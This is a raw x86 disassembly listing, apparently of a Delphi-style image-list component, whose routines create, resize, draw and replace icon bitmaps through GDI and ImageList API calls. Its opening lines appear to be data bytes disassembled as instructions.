add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
mov eax 0x20000000
retn
je r-xdata
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
outsd
inc ebp
add al cl
outsd
inc ebp
add [ eax ] ch
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
inc edx
popad
jb r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0xe000408d
outsd
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
outsb
je r-xdata
ror [ ebx - 0x709e173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x4de80f74 ] 0xc5
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cwde
pop [ ecx ]
add al [ eax ]
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
mov eax eax
in al 0x6e
inc ebp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x6ee4c08b
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
call 0x1445b4ed
jg r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_457048
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_457094
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41ffc4
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4570e8
push ebx
push esi
push edi
call sub_4035e0
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a6b8
mov edx eax
mov eax edi
call sub_4580b4
mov eax [ edi + 0x50 ]
call sub_403254
mov eax edi
call sub_457444
mov eax [ edi + 0x4c ]
call sub_403254
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
call sub_403254
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_457154
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_457201
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45803c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_457220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457208
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_457220
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4572c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_429f00
mov eax ebx
call sub_429380
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423c94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_429380
pop edx
call sub_4240b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572c8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4572e4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_457220
pop ecx
pop edx
pop ebx
retn
sub_45731c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_45720c
test al al
je r-xdata
mov eax esi
call sub_4579dc
mov eax esi
call sub_457220
mov eax esi
mov si 0xffef
call sub_403450
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_457360
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_45720c
test al al
je r-xdata
mov eax esi
call sub_4579dc
mov eax esi
call sub_457220
mov eax esi
mov si 0xffef
call sub_403450
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_4573a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457444
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4572e4
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403450
sub_4573f0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_457fc4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4293ec
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_457444
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403450
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_4573e0
push eax
call ImageList_Destroy
sub_45747c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45750f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45720c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457516
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov edx eax
mov eax ebx
call sub_4579e8
sub_45751c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4575cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4575ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_457214
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4573f0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4573f0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575b5
mov eax [ ebp - 0x10 ]
call sub_403254
retn
sub_4575e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4576e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4573f0
push eax
mov eax [ ebp - 0x4 ]
call sub_4573e0
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4576ee
mov eax [ ebp - 0xc ]
call sub_403254
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4576a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_42a2a4
mov eax [ ebp - 0x4 ]
call sub_457214
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4573d0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4573f0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403254
retn
sub_457704
push ebx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4573e0
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_457728
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45793f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45720c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457946
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fc8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_457fc4
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4575e8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
push ebp
push sub_4578f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4578d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4578b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a150
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_429380
call sub_424598
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4573e0
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_429380
call sub_424598
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4573e0
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_4573e0
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578ba
mov eax [ ebp - 0x10 ]
call sub_403254
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_457950
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4579cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457704
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45720c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax ebx
mov si 0xffef
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4579d6
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push esi
mov eax ebx
call sub_4573e0
push eax
call ImageList_Remove
sub_4579e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_457008
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403450
pop esi
pop ebx
retn
sub_457a20
push ebx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_4573e0
push eax
call ImageList_GetBkColor
call sub_457028
pop ebx
retn
sub_457a48
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_457008
push eax
mov eax ebx
call sub_457a20
call sub_457008
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_424598
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4573e0
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423c94
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_429380
pop edx
call sub_4240b4
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_429380
call sub_424598
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4573e0
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41919c
mov eax [ ebx + 0x54 ]
call sub_429380
call sub_424598
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_423c94
mov eax edi
call sub_424598
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_423c94
mov eax edi
call sub_424598
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42a150
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_457c1c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_457c40
pop ebx
pop ebp
retn 0xc
sub_457c40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_457c8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41919c
mov eax [ ebp - 0x4 ]
call sub_458920
xor eax eax
push ebp
push sub_457e25
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457e08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457deb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a150
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457df2
mov eax [ ebp - 0x10 ]
call sub_403254
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_429380
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4240b4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_424598
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_429380
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4240b4
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_424598
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45751c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_457e34
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4573e0
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_457c8c
sub_457e54
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
call sub_457444
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41abc8
mov eax ebx
call sub_4579dc
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45803c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_4573e0
mov edx eax
mov eax ebx
call sub_4572e4
mov eax ebx
call sub_45720c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4573e0
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_457214
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4573e0
push eax
call ImageList_GetBkColor
call sub_457028
mov edx eax
mov eax ebx
call sub_4579e8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_457e34
jmp r-xdata
sub_457f14
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41acac
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45803c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_4579dc
mov eax esi
call sub_4573e0
mov edx eax
mov eax ebx
call sub_4572e4
mov eax ebx
call sub_45720c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4573e0
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_457214
jmp r-xdata
mov eax esi
call sub_4573e0
push eax
call ImageList_GetBkColor
call sub_457028
mov edx eax
mov eax ebx
call sub_4579e8
mov edx esi
mov eax ebx
call sub_457e34
pop esi
pop ebx
retn
sub_457fc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458030
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458037
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_458064
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_41a5d0
mov si 0xffff
call sub_403450
inc ebp
dec edi
jne r-xdata
sub_4580b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a4c0
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a5d0
cmp ebp eax
jne r-xdata
sub_45810c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_408160
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_458150
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_457704
mov ebx eax
mov eax edi
call sub_457704
